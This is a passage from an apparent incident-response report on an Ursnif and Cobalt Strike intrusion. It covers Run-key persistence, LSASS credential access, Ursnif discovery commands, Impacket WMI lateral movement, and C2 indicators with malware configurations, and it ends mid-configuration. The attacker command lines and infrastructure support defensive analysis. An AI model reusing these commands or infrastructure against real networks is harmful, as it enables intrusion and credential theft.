Persistence\n\nOnce the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.\n\n```image\nAlt: Persistence\nDescription: The image displays a log output related to a malware persistence mechanism, specifically for the Ursnif malware. It includes various fields: 'UtcTime', 'ProcessGuid', 'ProcessId', and 'Image', showing details about the process initiated by 'C:\\Windows\\Explorer.EXE'. The 'TargetObject' indicates a registry path where a 'Run' key named 'ManagerText' is created. The 'Details' field shows a command that executes a LNK file to run a PowerShell script. This information is critical for understanding how Ursnif maintains persistence on a compromised system.\nTranscription: |\n  UtcTime: {2a3bd16a-1875-62a9-e508-000000000200}\n  ProcessGuid: {2a3bd16a-1875-62a9-e508-000000000200}\n  ProcessId: 9600\n  Image: C:\\Windows\\Explorer.EXE\n  TargetObject: HKU\\S-1-5-21-...\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ManagerText\n  Details: cmd /c start C:\\Users\\...\\ManagerText.lnk -ep unrestricted -file C:\\Users\\...\\ActiveDevice.ps1\n  User:\n```\n\n## Credential Access\n\nWe observed a process created by Cobalt Strike accessing lsass.exe. The GrantedAccess code of `0x1010` is a known indicator of such tools as Mimikatz. This was observed on both the beachhead host and a domain controller.\n\n```\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=10\nEventType=4\nComputerName=<REDACTED>\nUser=SYSTEM\nSid=S-1-5-18\nSidType=1\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=765707\nKeywords=None\nTaskCategory=Process accessed (rule: ProcessAccess)\nOpCode=Info\nMessage=Process accessed:\nRuleName: technique_id=T1003,technique_name=Credential Dumping\nUtcTime: <REDACTED>\nSourceProcessGUID: {aaadb608-97b2-630c-6750-000000000400}\nSourceProcessId: 4768\nSourceThreadId: 4248\nSourceImage: C:\\Windows\\system32\\rundll32.exe\nTargetProcessGUID: {aaadb608-45a2-62fc-0c00-000000000400}\nTargetProcessId: 672\nTargetImage: C:\\Windows\\system32\\lsass.exe\nGrantedAccess: 0x1010\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\Windows\\System32\\KERNELBASE.dll+20d0e|UNKNOWN(000002AA74CFD95C)\n```\n\n## Discovery\n\n### Ursnif related discovery\n\nAs we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment. The following commands were executed and their standard output was redirected to append to a file in the user’s %APPDATA%\\Local\\Temp\\\n\n```\ncmd /C \"wmic computersystem get domain |more > C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"systeminfo.exe > C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nslookup 127.0.0.1 >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"tasklist.exe /SVC >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"driverquery.exe >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net config workstation >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"nltest /domain_trusts /all_trusts >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view /all /domain >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"net view /all >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\ncmd /C \"echo -------- >> C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\"\n```\n\n### Manual discovery\n\nOnce the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands:\n\n```\nwhoami\nwhoami  /groups\ntime\nipconfig /all\nsysteminfo\n```\n\nThe threat actor quickly took interest in a support account. This account belonged to the Domain Admin group.\n\n```\nnet user <REDACTED>\n```\n\nThe threat actor also used a batch script to collect a list of all computer objects on the domain using `C:\\Windows\\system32\\cmd.exe /C adcomp.bat` which contained the PowerShell command:\n\n```\npowershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt\n```\n\nDuring the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the `/4` command line argument.\n\n```\nC:\\Windows\\system32\\taskmgr.exe /4\n```\n\n## Lateral Movement\n\nWMI was used to pivot to a domain controller on the network. The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.\n\nThe commands executed included directory traversal, host discovery, and execution of tools on the DC.\n\n```image\nAlt: WMI Commands\nDescription: The image displays a series of command line entries executed via the Windows Command Prompt (cmd.exe). Each command follows a structure that includes the command to be executed (e.g., 'firefox.exe', 'systeminfo', 'setup.msi'), along with parameters indicating silent execution (/Q), command execution context (/c), and output redirection to a specific path ('\\127.0.0.1\\ADMIN$'). The commands indicate lateral movement techniques that may have been used by threat actors during an intrusion, showcasing the commands used to interact with the system and gather information.\nTranscription: |\n  cmd.exe /Q /c firefox.exe 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c systeminfo 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd c:\\programdata 1> \\\\127.0.0.1\\ADMIN$\\__1661 738534 2>&1\n  cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__16617 38534 2>&1\n```\n\nA breakdown of the parent and child processes invoked:\n\n```image\nAlt: Process Breakdown\nDescription: The image displays a table detailing the hierarchy of processes involved in a cyber intrusion, specifically focusing on the execution of 'firefox.exe' and other related processes. It lists the 'Image' (executed process), 'ParentImage' (the parent process from which it was spawned), and 'ParentCommandLine' (the command line used to initiate the parent process). This information is crucial for understanding the execution flow and the relationships between the processes during the attack.\nTranscription: |\n  | Image                              | ParentImage                 | ParentCommandLine                                           |\n  | ---------------------------------- | --------------------------- | ----------------------------------------------------------- |\n  | C:\\ProgramData\\firefox.exe         | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c firefox.exe 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1 |\n  | C:\\Windows\\System32\\systeminfo.exe | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c systeminfo 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1  |\n  | C:\\Windows\\System32\\msiexec.exe    | C:\\Windows\\System32\\cmd.exe | cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\ADMIN$\\__1661 2>&1   |\n```\n\nThe command can be broken down as follows:\n\n- ‘Q’ indicates turn off echo – no response.\n- ‘C’ indicates to stop after command execution.\n- The 127.0.01 and ADMIN$ indicates C:\\Windows.\n- Output is achieved via the parameter ‘2>&1’, to redirect errors and output to one file:\n\n```image\nAlt: Command Breakdown\nDescription: The image displays a snippet of code that is indicative of a command being constructed for execution via Windows Management Instrumentation (WMI). The command involves redirecting output and error messages to a specified output file, utilizing the IP address 127.0.0.1, which refers to the local machine. The syntax includes elements for command redirection and network share access, suggesting its use in a context related to remote command execution or lateral movement in a network environment.\nTranscription: command += ' ' + '1> ' + '\\\\\\\\127.0.0.1\\\\%s' % self.__share + self.__output + ' 2>&1'\n```\n\nThis command line closely resembles the code within the wmiexec.py as part of the Impacket tool maintained by Fortra.\n\nAs Impacket interacts with remote endpoints via WMI over TCP via DCERPC, it’s possible to inspect network level packets:\n\n```image\nAlt: Network Packets\nDescription: The image appears to show a command line snippet that includes parameters for executing a command, likely related to remote execution via WMI (Windows Management Instrumentation). The command includes elements such as ‘Q’ to turn off echo, ‘C’ to stop after execution, and an indication of a local address (127.0.0.1). The formatting suggests that it captures the structure of a command execution using Impacket's functionality, which is relevant to the previously described cyber threat context.\nTranscription: PARAMETERS: cmd.exe /Q /c setup.msi 1> \\\\127.0.0.1\\1\n```\n\nThe use of Impacket by threat actors has been recently detailed by CISA in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.\n\n```image\nAlt: Impacket Process Hierarchy\nDescription: The image displays a cybersecurity advisory document co-authored by CISA, FBI, and NSA. It is titled 'Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.' The advisory emphasizes the use of the Impacket tool in cyber threats and provides insights into the implications for national security. The document features logos of the respective agencies and includes a TLP (Traffic Light Protocol) designation of 'WHITE,' indicating that the information can be shared freely.\nTranscription: |\n  JOINT CYBERSECURITY ADVISORY\n  Co-Authored by:\n  \n  - CISA\n  - FBI\n  - NSA\n  \n  Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization\n  \n  TLP:WHITE\n  Product ID:\n  October\n```\n\nThe Impacket process hierarchy in this case can be visualized as:\n\n```image\nAlt: Impacket Process Hierarchy\nDescription: The image is a flow diagram illustrating the process hierarchy related to the use of Windows Management Instrumentation (WMI) by a threat actor. It shows the interactions between different components, including a proxy process, Powershell, WMIPrvSE, Cmd, and the Systeminfo command. The diagram indicates the flow of commands and how they are executed, providing a visual representation of the technical processes involved in lateral movement and command execution during an intrusion.\nTranscription: |\n  Proxy Process\n      └── Powershell\n          └── DCERPC\n              └── WMIPrvSE\n                  └── wmiprvse.exe -secured -Embedding\n                      └── Cmd\n                          └── cmd.exe /Q /c systeminfo > \\\\127.0.0.1\\ADMIN$\\xxxxxxxx 2>&1\n                              └── Systeminfo\n                                  └── systeminfo\n```\n\nAt the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445. We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.\n\n```image\nAlt: WMI Requests\nDescription: The image is a screenshot of a network traffic analysis tool displaying a log of DCERPC (Distributed Component Object Model Remote Procedure Call) packets. The log includes details such as source port, destination port, protocol, length of packets, and a description of the information exchanged during the communication. The entries indicate various call types and responses involved in the DCERPC protocol, which is relevant for understanding the network activity associated with WMI commands and lateral movement in a cybersecurity context.\nTranscription: |\n  | Src port | Dst port | Protocol    | Length | Info                              |\n  | -------- | -------- | ----------- | ------ | --------------------------------- |\n  | 49671    | 59741    | DCERPC      | 388    | Bind_ack: call_id: 1, Fragment: 1 |\n  | 49671    | 59741    | DCERPC      | 468    | AUTH3: call_id: 1, Fragment: 1    |\n  | 49671    | 59741    | DCERPC      | 210    | Request: call_id: 2, Fragment: 1  |\n  | 49671    | 59741    | DCERPC      | 278    | Response: call_id: 2, Fragment: 1 |\n  | 49671    | 59741    | DCERPC      | 384    | Alter_context_resp: call_id: 1    |\n  | 49671    | 59741    | IRemUnknown | 182    | RemRelease request: Cnt=1         |\n  | 49671    | 59741    | IRemUnknown | 166    | RemRelease response -> S: 1       |\n  | 49671    | 59741    | DCERPC      | 384    | Alter_context: call_id: 1         |\n  | 49671    | 59741    | DCERPC      | 468    | AUTH3: call_id: 3, Fragment: 1    |\n  | 49671    | 59741    | DCERPC      | 226    | Request: call_id: 6, Fragment: 1  |\n```\n\nCorrelating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests.\n\n```image\nAlt: WMI Requests\nDescription: The image displays a section of log data related to a PowerShell process execution. It includes details such as the image path (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe), user, protocol (tcp), and connection initiation status. Additionally, it provides source and destination IP addresses, source and destination ports, and other technical parameters relevant to network activity monitoring. This information is critical for understanding the context of lateral movement within a network security incident.\nTranscription: |\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  User:\n  Protocol: tcp\n  Initiated: true\n  SourceIsIpv6: false\n  SourceIp:\n  SourceHostname: -\n  SourcePort: 59741\n  SourcePortName: -\n  DestinationIsIpv6: false\n  DestinationIp:\n  DestinationHostname: -\n  DestinationPort: 49671\n  DestinationPortName: -\n```\n\nThe destination port is within the ephemeral port range 49152–65535, which is for short-lived, time-based, communications RFC 6335.\n\n13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here:\nhttps://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf\n\nOne of the observed commands invoked via WMI was ‘firefox.exe’.\n\nThis was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.\n\n```image\nAlt: Firefox Process\nDescription: The image illustrates a process hierarchy involved in a cyber attack, specifically highlighting the interactions between various processes such as 'firefox.exe', 'cmd.exe', 'Powershell', and 'RunDLL32.exe'. It depicts a flow of control, showing how 'firefox.exe' is used for discovery and process injection, leading to credential dumping via 'RunDLL32.exe'. The image also indicates the command execution involving Active Directory discovery and the use of specific commands to interact with network resources.\nTranscription: |\n  c:\\programdata\n  C2: 193.201.9[.]199:443\n  \n                     +------------------+\n                     |   firefox.exe    |\n                     +------------------+\n                            |\n                            |  Discovery\n                            |\n                     +------------------+\n                     |      cmd.exe     |\n                     +------------------+\n                            |\n                            |  net group \"domain admins\" /domain\n                            |  time\n                            |  adcomp.bat\n                            |\n                     +------------------+\n                     |    Powershell    |\n                     +------------------+\n                            |\n                            |  Get-ADComputer -Filter * -Properties Name,...\n                            |\n                     +------------------+\n                     |   RunDLL32.exe   |\n                     +------------------+\n                            |\n                            |  Credential Dumping\n                            |\n                     +------------------+\n                     |      LSASS       |\n                     +------------------+\n                            |\n                     TargetUser: NT AUTHORITY\\SYSTEM\n```\n\nThe process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.\n\n```image\nAlt: Network Connections\nDescription: The image depicts a time series graph illustrating network connections over a 24-hour period. The y-axis represents the number of connections, with values ranging from 0 to 6,000, while the x-axis spans time from midnight to midnight of the following day. The graph shows a significant spike in connections, likely indicating a period of high activity, with a notable drop-off afterward. The area under the curve is shaded in purple, emphasizing the volume of connections generated during the observed time frame.\nTranscription: |\n  Graph Data:\n  - Y-axis: Number of Requests\n  - X-axis: Time (HH:MM)\n  - Maximum Requests: 6,000\n  - Minimum Requests: 0\n  - Data Points:\n    - 00:00 - 2,000\n    - 08:00 - 6,000\n    - 16:00 - 4,000\n    - 00:00 - 2,000\n    - 08:00 - 6,000\n```\n\nRDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.\n\n```image\nAlt: RDP Connections\nDescription: The image displays a log entry indicating a network connection detected related to the execution of the 'firefox.exe' process. It includes technical details such as the technique ID (T1021), process GUID, process ID, user, protocol (TCP), source and destination IP addresses and ports, and the image path of the executed process. This information is likely relevant for cybersecurity analysis, particularly in the context of tracking lateral movement and command execution in a network intrusion scenario.\nTranscription: |\n  Network connection detected:\n  RuleName: technique_id=T1021,technique_name=Remote Services\n  UtcTime:\n  ProcessGuid: {aaadb608-86c9-630c-8d4d-000000000040}\n  ProcessId: 6544\n  Image: C:\\ProgramData\\firefox.exe\n  User:\n  Protocol: tcp\n  Initiated: true\n  SourceIsIpv6: false\n  SourceIp: 10.       60\n  SourceHostname: -\n  SourcePort: 61421\n  DestinationIsIpv6: false\n  DestinationIp: 10.       60\n  DestinationHostname: -\n  DestinationPort: 3389\n  DestinationPortName: -\n```\n\n```image\nAlt: RDP Connections\nDescription: The image displays a table containing data about processes related to the executable 'firefox.exe'. Each row represents an instance of the process execution with the following columns: 'process.pid' (process ID), 'process.executable' (executable path), 'source.ip' (IP address of the source), 'destination.ip' (IP address of the destination), and 'destination.port' (port number). The source IP consistently shows '10.60', while the destination IP varies slightly across different rows, indicating multiple connections or actions taken by the same process.\nTranscription: |\n  | process.pid | process.executable         | source.ip | destination.ip | destination.port |\n  | ----------- | -------------------------- | --------- | -------------- | ---------------- |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n```\n\n## Command and Control\n\n### Ursnif\n\nUrsnif was seen using the following domains and IPs:\n\n```\n5.42.199.83\nsuperliner.top\n62.173.149.7\ninternetlines.in\n31.41.44.97\nsuperstarts.top\n31.41.44.27\nsuperlinez.top\n31.41.44.27\ninternetlined.com\n208.91.197.91\ndenterdrigx.com\n187.190.48.135\n210.92.250.133\n189.143.170.233\n201.103.222.246\n151.251.24.5\n190.147.189.122\n115.88.24.202\n211.40.39.251\n187.195.146.2\n186.182.55.44\n222.232.238.243\n211.119.84.111\n51.211.212.188\n203.91.116.53\n115.88.24.203\n190.117.75.91\n181.197.121.228\n190.167.61.79\n109.102.255.230\n211.119.84.112\n190.107.133.19\n185.95.186.58\n175.120.254.9\n46.194.108.30\n190.225.159.63\n190.140.74.43\n187.156.56.52\n195.158.3.162\n138.36.3.134\n109.98.58.98\n24.232.210.245\n222.236.49.123\n175.126.109.15\n124.109.61.160\n95.107.163.44\n93.152.141.65\n5.204.145.65\n116.121.62.237\n31.166.129.162\n222.236.49.124\n211.171.233.129\n211.171.233.126\n211.53.230.67\n196.200.111.5\n190.219.54.242\n190.167.100.154\n110.14.121.125\n58.235.189.192\n37.34.248.24\n110.14.121.123\n179.53.93.16\n175.119.10.231\n211.59.14.90\n188.48.64.249\n187.232.150.225\n186.7.85.71\n148.255.20.4\n91.139.196.113\n41.41.255.235\n31.167.236.174\n189.165.2.131\n1.248.122.240\n```\n\nWe also observed several modules for Ursnif downloaded from the following IP:\n\n```\n193.106.191.186\n  3db94cf953886aeb630f1ae616a2ec25  cook32.rar\n  d99cc31f3415a1337e57b8289ac5011e  cook64.rar\n  a1f634f177f73f112b5356b8ee04ad19  stilak32.rar\n  8ea6ad3b1acb9e7b2e64d08411af3c9a  stilak64.rar\n  0c5862717f00f28473c39b9cba2953f4  vnc32.rar\n  ce77f575cc4406b76c68475cb3693e14  vnc64.rar\n```\n\nJoeSandbox reported this sample having the following configuration:\n\n```\n{\n  \"RSA Public Key\": \"WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknjD2zYXaAp3+wR0kAZI+LVG1CUiDgK2lhHKV91eobjLR/Z/RtHa+MZM10+zZoBGCk+VjMy7gWkzoCrrhs6/Bft/lYT9NzAGBQ4ZZgJTkXW4tVgEQiGmoc7Ta1/NqrbaQBEciYTW7E4egMKHQeGNrjd94u5PZha7GgX7aseTe7/68QIz2hc7Xl2gtUGQYYVqKgGpKjKrQT5jpYbcjLE+VoRjcWucFAPAfIryWH1A4T+PbO5+eHGGCIM/fAuYU/58JZn0HUmtKm9wHYCUJ/uGotKAI=\",\n  \"c2_domain\": [\n    \"superliner.top\",\n    \"superlinez.top\",\n    \"internetlined.com\",\n    \"internetlines.in\",\n    \"medialists.su\",\n    \"medialists.ru\",\n    \"mediawagi.info\",\n    \"mediawagi.ru\",\n    \"5.42.199.83\",\n    \"denterdrigx.com\",\n    \"и\",\n    \"digserchx.at\"\n  ],\n  \"ip_check_url\": [\n    \"http://ipinfo.io/ip\",\n    \"http://curlmyip.net\"\n  ],\n  \"serpent_key\": \"Jv1GYc8A8hCBIeVD\",\n  \"tor32_dll\": \"file://c:\\\\test\\\\test32.dll\",\n  \"tor64_dll\": \"file://c:\\\\test\\\\tor64.dll\",\n  \"server\": \"50\",\n  \"sleep_time\": \"1\",\n  \"SetWaitableTimer_value(CRC_CONFIGTIMEOUT)\": \"60\",\n  \"time_value\": \"60\",\n  \"SetWaitableTimer_value(CRC_TASKTIMEOUT)\": \"60\",\n  \"SetWaitableTimer_value(CRC_SENDTIMEOUT)\": \"300\",\n  \"SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)\": \"60\",\n  \"not_use(CRC_BCTIMEOUT)\": \"10\",\n  \"botnet\": \"3000\",\n  \"SetWaitableTimer_value\": \"1\"\n}\n```\n\nPivoting on domains registered in WHOIS with the email `snychkova73@bk.ru` or organization `Rus Lak`, reveals many similar domains as seen in this intrusion.\n\n```image\nAlt: WHOIS Domains\nDescription: The image displays WHOIS records for various domains associated with the Ursnif malware, showing details such as the registrar, domain status, and contact email. Key attributes highlighted include the email 'snychkova73@bk.ru' and the organization name 'Rus Lak.' The record appears to detail the registration history of the domain 'superliner.top,' including its creation and expiry dates, indicating its current registration status and contact information.\nTranscription: |\n  Whois Records\n  CHANGE HISTORY\n  Date       Changes\n  2022-10-29\n  2022-08-24  Email\n  \n  Record Updated 2022-08-24 : Last Scanned 2022-11-05\n  Checked by RiskIQ | Expires in 8 months | Created 4 months ago | Hide Diff | Hide Raw Record\n  \n  Attribute                     Value\n  WHOIS Server                  whois.eranet.com\n  Registrar                     Eranet International Limited\n  Domain Status                 clientTransferProhibited serverHold\n  Email                         snychkova73@bk.ru (registrant, admin, tech)\n  Name                          REDACTED FOR PRIVACY\n  Organization                  Rus Lak (registrant, admin, tech)\n  Street                        -\n  City                          -\n  State                         -\n  Postal Code                   -\n  Country                       -\n  Phone                         -\n  \n  NameServers                   a.dnspod.com\n                               b.dnspod.com\n  \n  Domain Name: superliner.top\n  Registry Domain ID: D202208248210001G_86804552-top\n  Registrar WHOIS Server: whois.eranet.com\n  Registrar URL: http://www.eranet.com\n  Updated Date: 2022-08-24T08:27:11Z\n  Creation Date: 2022-08-24T08:27:11Z\n  Registry Expiry Date: 2023-08-24T08:27:11Z\n  Registrar: Eranet International Limited\n  Registrar IANA ID: 1868\n  Registrar Abuse Contact Email: info@todaynic.com\n  Registrar Abuse Contact Phone: +852.7563810566\n  Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n  Domain Status: serverHold https://icann.org/epp#serverHold\n  Registrant ID: REDACTED FOR PRIVACY\n  Registrant Name: REDACTED FOR PRIVACY\n  Registrant Organization: Rus Lak\n  Registrant Street: REDACTED FOR PRIVACY\n  Registrant City: REDACTED FOR PRIVACY\n  Registrant State/Province: Voronezh\n  Registrant Postal Code: REDACTED FOR PRIVACY\n  Registrant Country: RU\n  Registrant Phone: REDACTED FOR PRIVACY\n  Registrant Phone Ext: REDACTED FOR PRIVACY\n  Registrant Fax: +7.89278708414\n  Registrant Fax Ext:\n  Registrant Email: snychkova73@bk.ru\n```\n\n```image\nAlt: WHOIS Domains\nDescription: The image is a screenshot of a WHOIS domain registration database, displaying a list of domains registered with the email 'snychkova73@bk.ru'. It includes columns for 'Focus', 'Email', 'Registered', 'Expires', and 'Tags'. The domains listed are related to various online services, and their registration dates range from October to December 2022.\nTranscription: |\n  | Focus               | Email             | Registered | Expires    | Tags |\n  | ------------------- | ----------------- | ---------- | ---------- | ---- |\n  | agenziaonline.top   | snychkova73@bk.ru | 2022-12-01 | 2023-12-01 |      |\n  | onlineagenzia.top   | snychkova73@bk.ru | 2022-12-01 | 2023-12-01 |      |\n  | onlynetwork.top     | snychkova73@bk.ru | 2022-11-28 | 2023-11-28 |      |\n  | optinetwork.top     | snychkova73@bk.ru | 2022-11-28 | 2023-11-28 |      |\n  | internetnetwork.top | snychkova73@bk.ru | 2022-11-26 | 2023-09-22 |      |\n  | interspin.top       | snychkova73@bk.ru | 2022-11-26 | 2023-09-22 |      |\n  | superliner.top      | snychkova73@bk.ru | 2022-10-29 | 2023-08-24 |      |\n  | superlinz.top       | snychkova73@bk.ru | 2022-10-29 | 2023-08-24 |      |\n```\n\n### Cobalt Strike\n\nThe following Cobalt Strike C2 server was observed:\n\n```\n193.201.9.199:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: f176ba63b4d68e576b5ba345bec2c7b7\nCertificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c]\nNot Before: 2015/05/20 18:26:24 UTC\nNot After: 2025/05/17 18:26:24 UTC\nIssuer Org:\nSubject Common:\nSubject Org:\nPublic Algorithm: rsaEncryption\n```\n\nThe following Cobalt Strike configuration was observed:\n\n```\n{\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"pipename\": null,\n  \"dns_beacon\": {\n    \"put_metadata\": null,\n    \"get_TXT\": null,\n    \"get_AAAA\": null,\n    \"get_A\": null,\n    \"beacon\": null,\n    \"maxdns\": null,\n    \"dns_sleep\": null,\n    \"put_output\": null,\n    \"dns_idle\": null\n  },\n  \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"post_ex\": {\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\"\n  },\n  \"stage\": {\n    \"cleanup\": \"false\"\n  },\n  \"process_inject\": {\n    \"stub\": \"IiuPJ9vfuo3dVZ7son6mSA==\",\n    \"transform_x64\": [],\n    \"transform_x86\": [],\n    \"startrwx\": \"true\",\n    \"min_alloc\": \"0\",\n    \"userwx\": \"true\",\n    \"execute\": [\n      \"CreateThread\",\n      \"SetThreadContext\",\n      \"CreateRemoteThread\",\n      \"RtlCreateUserThread\"\n    ],\n    \"allocator\": \"VirtualAllocEx\"\n  },\n  \"uses_cookies\": \"true\",\n  \"http_post_chunk\": \"0\",\n  \"ssh\": {\n    \"privatekey\": null,\n    \"username\": null,\n    \"password\": null,\n    \"port\": null,\n    \"hostname\": null\n  },\n  \"useragent_header\": null,\n  \"maxgetsize\": \"1048576\",\n  \"proxy\": {\n    \"behavior\": \"Use IE settings\",\n    \"password\": null,\n    \"username\": null,\n    \"type\": null\n  },\n  \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"server\": {\n    \"publickey\": 